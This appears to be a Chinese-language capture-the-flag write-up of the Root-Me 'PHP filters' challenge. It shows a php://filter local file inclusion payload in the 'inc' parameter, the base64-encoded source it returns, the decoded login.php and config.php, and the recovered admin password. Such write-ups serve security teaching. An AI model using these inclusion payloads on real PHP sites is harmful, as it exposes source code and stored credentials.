Root-Me [PHP filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-filters)
===

提供一個有頁面，有首頁、登入頁面。

## 解題關鍵
1. php://filter

## 提示訊息
```
Retrieve the administrator password of this application.
```

## 解題方法
該題的 URL Payload 為 `inc`，簡單猜測為 `include` 的縮寫，簡單的說應該是在考 `php://filter` 偽協議，其中 exploit 方法如下。  

```
php://filter/read=convert.base64-encode/resource=index.php
```

嘗試取得 Login 頁面原始碼:  

```
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=login.php
```
得到  

```
PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4=
```

Base64 Decode 之後得到:

```php
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>

<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php } ?>
```

猜測帳號密碼應該是存放在 `config.php`，接著透過同樣的方式取得 `config.php` 頁面的原始碼，如下。

```php
<?php

$username="admin";
$password="DAPt9D2mky0APAF";

?>
```

## Reference
[php文件包含漏洞](https://chybeta.github.io/2017/10/08/php文件包含漏洞/)
## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)